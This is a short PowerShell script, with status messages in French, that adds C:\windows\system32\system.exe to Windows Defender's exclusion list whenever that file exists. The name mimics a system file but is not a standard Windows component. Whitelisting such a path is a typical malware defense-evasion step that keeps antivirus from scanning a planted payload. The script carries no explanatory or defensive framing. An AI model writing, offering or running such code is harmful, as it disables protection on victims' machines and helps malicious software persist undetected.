$filePath = "C:\windows\system32\system.exe"

if (Test-Path -Path $filePath -PathType Leaf) {
    $defenderExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
    if ($defenderExclusions -notcontains $filePath) {
        $defenderExclusions += $filePath
        Set-MpPreference -ExclusionPath $defenderExclusions
        Write-Host "L'exclusion pour $filePath a été ajoutée avec succès à Windows Defender."
    } else {
        Write-Host "L'exclusion pour $filePath est déjà présente dans Windows Defender."
    }
} else {
    Write-Host "Le fichier $filePath n'existe pas."
}